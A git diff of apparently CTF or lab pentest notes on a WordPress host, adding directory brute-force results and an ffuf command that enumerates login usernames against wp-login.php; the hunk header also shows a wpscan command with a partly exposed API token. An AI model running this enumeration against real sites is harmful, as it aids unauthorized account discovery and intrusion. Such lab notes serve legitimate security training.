@@ -30,3 +30,30 @@ wpscan -e ap --plugins-detection aggressive --url http://$IP --api-token 5L1iakB
 
 Plugins
 - akismet
+
+```python
+/.html                (Status: 403) [Size: 276]  
+/index.php            (Status: 301) [Size: 0] [--> http://10.13.37.11/]  
+/.php                 (Status: 403) [Size: 276]  
+/wp-content           (Status: 301) [Size: 315] [--> http://10.13.37.11/wp-content/]  
+/scripts              (Status: 401) [Size: 458]  
+/wp-login.php         (Status: 200) [Size: 5036]  
+/license.txt          (Status: 200) [Size: 19935]  
+/wp-includes          (Status: 301) [Size: 316] [--> http://10.13.37.11/wp-includes/]  
+/dev                  (Status: 301) [Size: 308] [--> http://10.13.37.11/dev/]  
+/javascript           (Status: 301) [Size: 315] [--> http://10.13.37.11/javascript/]  
+/readme.html          (Status: 200) [Size: 7278]  
+/wp-trackback.php     (Status: 200) [Size: 135]  
+/wp-admin             (Status: 301) [Size: 313] [--> http://10.13.37.11/wp-admin/]  
+/backups              (Status: 301) [Size: 312] [--> http://10.13.37.11/backups/]  
+/xmlrpc.php           (Status: 405) [Size: 42]  
+/.php                 (Status: 403) [Size: 276]  
+/.html                (Status: 403) [Size: 276]  
+/wp-signup.php        (Status: 302) [Size: 0] [--> http://10.13.37.11/wp-login.php?action=register]
+```
+
+
+
+```bash
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://10.13.37.11/wp-login.php -X POST -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.13.37.11%2Fwp-admin%2F&testcookie=1" -fr "Unknown username" -H "Content-Type: application/x-www-form-urlencoded"
+```
